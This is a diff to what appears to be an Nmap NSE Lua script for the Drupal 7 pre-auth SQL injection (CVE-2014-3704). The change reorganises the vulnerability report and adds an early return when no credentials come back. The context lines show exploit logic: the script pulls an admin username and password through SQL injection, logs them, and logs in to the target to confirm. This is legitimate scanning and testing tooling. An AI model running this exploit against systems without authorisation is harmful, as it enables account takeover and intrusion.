@@ -344,7 +344,32 @@ action = function(host, port)
     cleanup = "false"
   end
 
+  local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
+  local vuln = {
+    title = 'Drupal - pre Auth SQL Injection Vulnerability',
+    state = vulns.STATE.NOT_VULN,
+    description = [[
+  The expandArguments function in the database abstraction API in
+  Drupal core 7.x before 7.32 does not properly construct prepared
+  statements, which allows remote attackers to conduct SQL injection
+  attacks via an array containing crafted keys.
+    ]],
+    IDS = {CVE = 'CVE-2014-3704'},
+    references = {
+      'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html',
+      'https://www.drupal.org/SA-CORE-2014-005',
+      'http://www.securityfocus.com/bid/70595',
+    },
+    dates = {
+      disclosure = {year = '2014', month = '10', day = '15'},
+    },
+  }
+
   local user, passwd = do_sql_query(host, port, uri, nil)
+
+  if user == nil or passwd == nil then
+    return vulnReport:make_output(vuln)
+  end
 
   stdnse.debug(1, string.format("logging in as admin user (username: '%s'; passwd: '%s')", user, passwd))
   local data = {
@@ -357,26 +382,7 @@ action = function(host, port)
   local res = http.post(host, port, uri .. "?q=/user/login", nil, nil, data)
 
   if res.status == 302 and res.cookies[1].name ~= nil then
-    local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
-    local vuln = {
-      title = 'Drupal - pre Auth SQL Injection Vulnerability',
-      state = vulns.STATE.NOT_VULN,
-      description = [[
-The expandArguments function in the database abstraction API in
-Drupal core 7.x before 7.32 does not properly construct prepared
-statements, which allows remote attackers to conduct SQL injection
-attacks via an array containing crafted keys.
-      ]],
-      IDS = {CVE = 'CVE-2014-3704'},
-      references = {
-        'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html',
-        'https://www.drupal.org/SA-CORE-2014-005',
-        'http://www.securityfocus.com/bid/70595',
-      },
-      dates = {
-        disclosure = {year = '2014', month = '10', day = '15'},
-      },
-    }
+
     stdnse.debug(1, string.format("logged in as admin user (username: '%s'; passwd: '%s'). Target is vulnerable.", user, passwd))
     vuln.state = vulns.STATE.EXPLOIT
 
